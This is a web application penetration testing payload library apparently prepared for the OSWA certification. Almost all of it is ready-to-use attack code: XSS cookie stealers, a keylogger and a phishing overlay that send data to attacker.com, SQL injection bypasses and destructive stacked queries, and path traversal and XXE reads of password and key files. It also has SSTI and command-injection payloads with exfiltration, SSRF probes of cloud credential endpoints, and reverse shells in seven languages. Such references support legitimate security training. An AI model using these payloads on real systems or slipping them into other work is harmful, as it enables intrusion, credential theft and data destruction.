# Master Payload Reference - OSWA

**Comprehensive payload library for web application penetration testing**

---

## Table of Contents
1. [XSS Payloads](#xss-payloads)
2. [SQL Injection Payloads](#sql-injection-payloads)
3. [Directory Traversal Payloads](#directory-traversal-payloads)
4. [XXE Payloads](#xxe-payloads)
5. [SSTI Payloads](#ssti-payloads)
6. [Command Injection Payloads](#command-injection-payloads)
7. [SSRF Payloads](#ssrf-payloads)
8. [CSRF Payloads](#csrf-payloads)
9. [Encoding Reference](#encoding-reference)
10. [Reverse Shell Payloads](#reverse-shell-payloads)

---

## XSS Payloads

### Basic Detection
```javascript
<script>alert(1)</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>
<svg/onload=alert(1)>
<img src=x onerror=alert(1)>
```

### Context-Specific

#### HTML Context
```html
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<input autofocus onfocus=alert(1)>
```

#### Attribute Context
```html
" autofocus onfocus=alert(1) x="
" onmouseover="alert(1)
' autofocus onfocus='alert(1)' x='
" onfocus="alert(1)" autofocus="
</textarea><script>alert(1)</script>
```

#### JavaScript Context
```javascript
'-alert(1)-'
';alert(1);//
</script><script>alert(1)</script>
'-alert(document.domain)-'
';alert(String.fromCharCode(88,83,83))//
```

#### URL Context
```javascript
javascript:alert(1)
javascript:alert(document.cookie)
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

### Filter Bypasses

#### Case Manipulation
```javascript
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x ONERROR=alert(1)>
<SvG OnLoAd=alert(1)>
```

#### Encoding Bypasses
```javascript
&#60;script&#62;alert(1)&#60;/script&#62;
\u003cscript\u003ealert(1)\u003c/script\u003e
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>
```

#### Tag Alternatives
```html
<svg/onload=alert(1)>
<iframe src="javascript:alert(1)">
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
```

#### Event Handler Alternatives
```html
onload=alert(1)
onerror=alert(1)
onfocus=alert(1)
onmouseover=alert(1)
onclick=alert(1)
onanimationstart=alert(1)
ontransitionend=alert(1)
```

### Advanced XSS

#### Cookie Stealer
```javascript
<script>
fetch('https://attacker.com/steal?c='+document.cookie);
</script>

<script>
new Image().src='https://attacker.com/steal?c='+document.cookie;
</script>

<img src=x onerror="fetch('https://attacker.com?c='+document.cookie)">
```

#### Session Hijacker
```javascript
<script>
fetch('https://attacker.com/log', {
  method: 'POST',
  body: JSON.stringify({
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    url: window.location.href
  })
});
</script>
```

#### Keylogger
```javascript
<script>
document.onkeypress = function(e) {
  fetch('https://attacker.com/log?key=' + e.key);
}
</script>
```

#### Phishing Overlay
```javascript
<script>
document.body.innerHTML = `
  <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:99999">
    <h2>Session Expired - Please Re-login</h2>
    <form action="https://attacker.com/phish" method="POST">
      Username: <input name="user"><br>
      Password: <input type="password" name="pass"><br>
      <button>Login</button>
    </form>
  </div>
`;
</script>
```

#### BeEF Hook
```html
<script src="http://attacker.com:3000/hook.js"></script>
```

### Polyglot Payloads
```javascript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

---

## SQL Injection Payloads

### Detection Payloads
```sql
'
"
`
')
")
`)
'))
"))
`))
```

### Authentication Bypass
```sql
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
' OR '1'='1'#
' OR 1=1--
' OR 1=1#
' OR 1=1/*
admin' OR '1'='1
admin'--
admin' #
admin'/*
' OR 'x'='x
') OR ('x'='x
' OR 'a'='a
') OR 'a'='a'--
admin') OR ('1'='1'--
```

### Union-Based
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,2,3--
' UNION SELECT username,password FROM users--
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

### Boolean-Based Blind
```sql
' AND '1'='1
' AND '1'='2
' AND 1=1--
' AND 1=2--
' AND (SELECT 'a' FROM users LIMIT 1)='a
' AND SUBSTRING(version(),1,1)='5
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a
```

### Time-Based Blind
```sql
-- MySQL
' AND SLEEP(5)--
' AND IF(1=1, SLEEP(5), 0)--
' AND IF(SUBSTRING(version(),1,1)='5', SLEEP(5), 0)--
' AND BENCHMARK(10000000, MD5('test'))--

-- PostgreSQL
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- SQL Server
'; IF (1=1) WAITFOR DELAY '00:00:05'--
'; WAITFOR DELAY '00:00:05'--

-- Oracle
' AND DBMS_LOCK.SLEEP(5)--
```

### Error-Based
```sql
-- MySQL
' AND 1=CONVERT(int, @@version)--
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS INT)--
' AND extractvalue(1, concat(0x7e, (SELECT @@version)))--
' AND updatexml(1, concat(0x7e, (SELECT @@version)), 1)--

-- PostgreSQL
' AND 1=CAST((SELECT version()) AS INT)--

-- SQL Server
' AND 1=CONVERT(int, @@version)--
```

### Stacked Queries
```sql
'; DROP TABLE users--
'; CREATE TABLE hacked (data varchar(100))--
'; INSERT INTO users VALUES ('hacker','pass')--
'; UPDATE users SET password='hacked' WHERE username='admin'--
```

### Out-of-Band
```sql
-- MySQL (Windows only)
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\a'))--

-- SQL Server
'; EXEC master..xp_dirtree '\\\\'+@@version+'.attacker.com\\a'--

-- Oracle
' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM users WHERE rownum=1)) FROM dual--
```

### Database-Specific

#### MySQL
```sql
SELECT @@version
SELECT database()
SELECT user()
SELECT schema_name FROM information_schema.schemata
SELECT table_name FROM information_schema.tables WHERE table_schema=database()
SELECT column_name FROM information_schema.columns WHERE table_name='users'
SELECT LOAD_FILE('/etc/passwd')
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'
```

#### PostgreSQL
```sql
SELECT version()
SELECT current_database()
SELECT current_user
SELECT datname FROM pg_database
SELECT tablename FROM pg_tables WHERE schemaname='public'
SELECT column_name FROM information_schema.columns WHERE table_name='users'
```

#### SQL Server
```sql
SELECT @@version
SELECT DB_NAME()
SELECT SYSTEM_USER
SELECT name FROM master..sysdatabases
SELECT name FROM sysobjects WHERE xtype='U'
EXEC xp_cmdshell 'whoami'
```

#### Oracle
```sql
SELECT banner FROM v$version
SELECT * FROM user_tables
SELECT column_name FROM all_tab_columns WHERE table_name='USERS'
SELECT username||':'||password FROM users WHERE rownum=1
```

### WAF Bypasses
```sql
/*!50000UNION*/ /*!50000SELECT*/
UNION/**/SELECT
UnIoN SeLeCt
%55nion %53elect
uni<>on sel<>ect
+union+select+
union+distinctROW+select
union+/*!select*/
```

---

## Directory Traversal Payloads

### Linux Payloads
```
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../etc/shadow
../../../etc/hosts
../../../etc/hostname
../../../etc/issue
../../../proc/self/environ
../../../proc/self/cmdline
../../../var/log/apache2/access.log
../../../var/log/nginx/access.log
../../../var/www/html/.env
../../../var/www/html/config.php
../../../home/user/.ssh/id_rsa
../../../root/.ssh/id_rsa
```

### Windows Payloads
```
..\..\..\windows\win.ini
..\..\..\..\windows\system32\drivers\etc\hosts
..\..\..\windows\system32\config\sam
..\..\..\boot.ini
..\..\..\..\inetpub\wwwroot\web.config
..\..\..\windows\panther\unattend.xml
```

### Encoded Payloads
```
# URL Encoding
..%2F..%2F..%2Fetc%2Fpasswd
..%2f..%2f..%2fetc%2fpasswd

# Double URL Encoding
..%252F..%252F..%252Fetc%252Fpasswd

# Unicode Encoding
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
```

### Filter Bypasses
```
# Double traversal
....//....//....//etc/passwd

# Inconsistent filtering
....//...//.../etc/passwd

# Null byte (PHP < 5.3)
../../../../etc/passwd%00.jpg
../../../../etc/passwd%00

# Mixed slashes
..\/..\/..\/etc/passwd
..\/..\/..\etc\passwd
```

### PHP Wrappers
```
# Base64 encode source
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=config.php

# ROT13 encoding
php://filter/read=string.rot13/resource=index.php

# Read POST data (for RCE)
php://input

# Data wrapper
data://text/plain,<?php system('id'); ?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==

# Expect wrapper (if enabled)
expect://id
expect://whoami

# Zip wrapper
zip://uploads/file.zip%23shell.php

# Phar wrapper
phar://uploads/file.zip/shell.php
```

---

## XXE Payloads

### Classic XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
```

### XXE with Parameter Entity
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY % wrapper "<!ENTITY content '%xxe;'>">
  %wrapper;
]>
<root>&content;</root>
```

### Blind XXE (Out-of-Band)
```xml
<!-- Attacker's XML -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
  %send;
]>
<root></root>

<!-- evil.dtd on attacker server -->
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://attacker.com:8000/?data=%file;'>">
%all;
```

### XXE via XInclude
```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <data>
    <xi:include parse="text" href="file:///etc/passwd"/>
  </data>
</root>
```

### XXE in SVG Upload
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

### SSRF via XXE
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>
```

### Error-Based XXE
```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % error "<!ENTITY content SYSTEM 'file:///nonexistent/%file;'>">
  %error;
]>
<root>&content;</root>
```

### XXE with PHP Expect
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<root>&xxe;</root>
```

### XXE Billion Laughs (DoS)
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<lolz>&lol4;</lolz>
```

---

## SSTI Payloads

### Detection Payloads
```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
```

### Jinja2 (Python/Flask)
```python
{{config}}
{{config.items()}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{joiner.__init__.__globals__.os.popen('id').read()}}
{{namespace.__init__.__globals__.os.popen('id').read()}}

# Reverse shell
{{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"').read()}}
```

### Twig (PHP/Symfony)
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
{{['id']|map('system')|join(',')}}
{{"<?php system($_GET['cmd']);?>"|file_put_contents('shell.php')}}
```

### FreeMarker (Java)
```java
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder",["calc.exe"]).start()}
${"freemarker.template.utility.Execute"?new()("id")}
```

### Velocity (Java)
```java
#set($e="e")
$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")

#set($x='')
$x.class.forName('java.lang.Runtime').getRuntime().exec('id')
```

### ERB (Ruby)
```ruby
<%= system('id') %>
<%= `id` %>
<%= %x(id) %>
<%= IO.popen('id').readlines() %>
<%= system('bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"') %>
```

### Smarty (PHP)
```php
{php}system('id');{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system($_GET['cmd']); ?>",self::clearConfig())}
```

### Tornado (Python)
```python
{% import os %}{{os.system('id')}}
{{__import__('os').popen('id').read()}}
```

### Pug (Node.js)
```javascript
#{global.process.mainModule.require('child_process').execSync('id')}
#{root.process.mainModule.constructor._load('child_process').exec('id')}
```

---

## Command Injection Payloads

### Command Separators
```bash
; whoami
| whoami
|| whoami
& whoami
&& whoami
%0A whoami
`whoami`
$(whoami)
```

### Time-Based Detection
```bash
; sleep 5
| sleep 5
& sleep 5 &
`sleep 5`
$(sleep 5)

# Windows
& timeout /t 5
&& ping -n 6 127.0.0.1
```

### Data Exfiltration
```bash
; curl http://attacker.com/$(whoami)
; wget http://attacker.com/?data=$(cat /etc/passwd)
; nslookup $(whoami).attacker.com
; ping -c 1 $(whoami).attacker.com
```

### Filter Bypasses

#### Space Bypass
```bash
;cat$IFS/etc/passwd
;cat${IFS}/etc/passwd
;{cat,/etc/passwd}
;cat</etc/passwd
;cat$IFS$9/etc/passwd
```

#### Keyword Bypass
```bash
;c''at /etc/passwd
;c'a't /etc/passwd
;c\at /etc/passwd
;/???/c?t /etc/passwd
;$(which cat) /etc/passwd
;tac /etc/passwd
;nl /etc/passwd
```

#### Quote Bypass
```bash
;w'h'o'a'm'i
;w"h"o"a"m"i
;w\h\o\a\m\i
;who$@ami
```

#### Encoding
```bash
# Hex
;$(echo -e "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")

# Base64
;$(echo "d2hvYW1p"|base64 -d)
;`echo "Y2F0IC9ldGMvcGFzc3dk"|base64 -d`

# Octal
;$(printf "\167\150\157\141\155\151")
```

---

## SSRF Payloads

### Localhost Variants
```
http://localhost
http://127.0.0.1
http://0.0.0.0
http://[::1]
http://[::ffff:127.0.0.1]
http://2130706433 (decimal)
http://0x7f000001 (hex)
http://0177.0.0.1 (octal)
http://localtest.me
http://127.0.0.1.nip.io
```

### Cloud Metadata
```
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# Google Cloud
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# DigitalOcean
http://169.254.169.254/metadata/v1/
```

### Protocol Handlers
```
file:///etc/passwd
file:///C:/Windows/win.ini
dict://localhost:6379/INFO
gopher://localhost:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a
ldap://localhost:389/
tftp://192.168.1.10/config.txt
```

### IP Encoding Bypasses
```
# Decimal
http://2130706433/ (127.0.0.1)
http://2852039166/ (169.254.169.254)

# Hexadecimal
http://0x7f.0x0.0x0.0x1/
http://0x7f000001/
http://0xa9.0xfe.0xa9.0xfe/

# Octal
http://0177.0.0.1/
http://0251.0376.0251.0376/

# Mixed
http://0x7f.0.0.1/
http://169.254.0xa9.0xfe/
```

---

## CSRF Payloads

### GET-Based
```html
<img src="https://vulnerable.com/action?param=value">
<script>new Image().src='https://vulnerable.com/action?param=value';</script>
<iframe src="https://vulnerable.com/action?param=value"></iframe>
```

### POST-Based
```html
<form id="csrf" action="https://vulnerable.com/action" method="POST">
  <input type="hidden" name="param" value="value">
</form>
<script>document.getElementById('csrf').submit();</script>
```

### JSON CSRF (if CORS allows)
```html
<script>
fetch('https://vulnerable.com/api/action', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({param: 'value'})
});
</script>
```

---

## Encoding Reference

### URL Encoding
```
Space: %20
!: %21
": %22
#: %23
$: %24
%: %25
&: %26
': %27
(: %28
): %29
<: %3C
>: %3E
/: %2F
\: %5C
```

### HTML Entity Encoding
```
<: &lt;
>: &gt;
": &quot;
': &#x27; or &apos;
&: &amp;
```

### Unicode Encoding
```
<: \u003c
>: \u003e
/: \u002f
\: \u005c
```

### Base64
```bash
# Encode
echo -n "string" | base64

# Decode
echo "c3RyaW5n" | base64 -d
```

---

## Reverse Shell Payloads

### Bash
```bash
bash -i >& /dev/tcp/attacker.com/4444 0>&1
bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f
```

### Netcat
```bash
nc -e /bin/bash attacker.com 4444
nc attacker.com 4444 | /bin/bash | nc attacker.com 5555
rm -f /tmp/p; mknod /tmp/p p && nc attacker.com 4444 0</tmp/p | /bin/bash 1>/tmp/p
```

### Python
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### PHP
```bash
php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Perl
```bash
perl -e 'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Ruby
```bash
ruby -rsocket -e'f=TCPSocket.open("attacker.com",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### PowerShell (Windows)
```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('attacker.com',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

**Use responsibly and only on authorized systems!**
